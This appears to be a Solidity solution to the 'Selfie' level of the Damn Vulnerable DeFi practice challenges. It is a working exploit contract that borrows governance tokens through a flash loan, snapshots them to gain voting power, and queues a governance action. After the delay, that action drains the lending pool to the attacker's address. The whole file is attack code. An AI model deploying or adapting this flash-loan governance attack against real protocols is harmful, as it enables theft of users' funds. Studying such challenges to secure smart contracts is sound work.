// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieExploit {
    address public attacker;
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public governanceToken;
    
    uint256 private queueActionId = 0;
    uint256 proposedAt = 0;

    constructor(address _pool, address _governance, address _governanceToken, address _attacker) {
        attacker = _attacker;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
    }

    function pwnPart1() public {
        pool.flashLoan(governanceToken.balanceOf(address(pool)));
    }

    function receiveTokens(address token,uint256 amount) public{
        //Do a flashloan making the proposal to drain to my address
        require(token == address(governanceToken));
        governanceToken.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        queueActionId = governance.queueAction(address(pool), data, 0);
        require(queueActionId != 0);
        proposedAt =  block.timestamp;
        governanceToken.transfer(address(pool), amount);
    }

    function pwnPart2() public {
        //Only can execute the proposal after 2 days (await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60])
        require(block.timestamp - proposedAt >= governance.getActionDelay(), "Can not trigger the execution of the proposal yet!");
        governance.executeAction(queueActionId);
    }
}
